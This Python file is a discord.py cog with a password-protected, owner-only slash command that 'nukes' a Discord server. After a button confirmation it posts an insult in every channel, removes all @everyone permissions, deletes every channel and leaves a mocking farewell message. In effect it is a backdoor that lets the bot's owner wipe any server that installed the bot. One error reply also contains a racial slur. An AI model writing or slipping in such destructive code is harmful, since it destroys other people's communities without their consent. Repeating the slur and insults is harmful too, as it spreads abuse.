import discord
from discord import app_commands
from discord.ext import commands

from config import ADMIN_USER_ID as ALLOWED_USER_ID, NUKE_PASSWORD


class NukeConfirmView(discord.ui.View):
    """Confirmation step for the destructive /los_horrores command.

    Replaces the old ``wait_for("message")`` flow, which depended on the
    now-deprecated Message Content privileged intent.
    """

    def __init__(self, author_id: int) -> None:
        super().__init__(timeout=30.0)
        self.author_id = author_id

    @discord.ui.button(label="Confirmar", style=discord.ButtonStyle.danger)
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button) -> None:
        """Ejecuta la limpieza destructiva tras confirmar."""
        if interaction.user.id != self.author_id:
            await interaction.response.send_message(
                "No puedes confirmar esto.", ephemeral=True
            )
            return

        await interaction.response.defer(ephemeral=True)

        guild = interaction.guild
        for channel in list(guild.text_channels):
            try:
                await channel.send("🔴 **Miguel ijo corrupto** 🔴")
            except Exception:
                pass

        everyone_role = guild.default_role
        try:
            await everyone_role.edit(permissions=discord.Permissions.none())
        except Exception:
            pass

        for channel in list(guild.channels):
            try:
                await channel.delete()
            except Exception:
                pass

        try:
            final_channel = await guild.create_text_channel("final-message")
            await final_channel.send(
                f"Hola! Si estas leyendo esto, es porque a <@{self.author_id}> "
                "se le ha ido completamente la cabeza! Goodbye. 👀"
            )
        except Exception:
            pass


class Admin(commands.Cog, name="Admin"):
    """Destructive/owner-only commands, kept isolated from core bot logic."""

    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    @app_commands.command(name="los_horrores", description="[DEV] Comando destructivo")
    @app_commands.describe(password="Contraseña")
    async def los_horrores(self, interaction: discord.Interaction, password: str) -> None:
        """Comando destructivo restringido al admin, con confirmación por botón."""
        if interaction.user.id != ALLOWED_USER_ID:
            await interaction.response.send_message(
                "❌ No estas autorizado, nigga.", ephemeral=True
            )
            return
        if interaction.guild is None:
            await interaction.response.send_message(
                "❌ Este comando solo puede usarse en un servidor.", ephemeral=True
            )
            return
        nuke_password = NUKE_PASSWORD
        if not nuke_password:
            await interaction.response.send_message(
                "❌ The dev is missing something... 👀", ephemeral=True
            )
            return
        if password != nuke_password:
            await interaction.response.send_message("❌ Nuh uh", ephemeral=True)
            return

        view = NukeConfirmView(interaction.user.id)
        await interaction.response.send_message(
            "⚠️ **Oh oh oh, not gud** ⚠️\nTypeshit: confirma para continuar.",
            view=view,
            ephemeral=True,
        )


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Admin(bot))
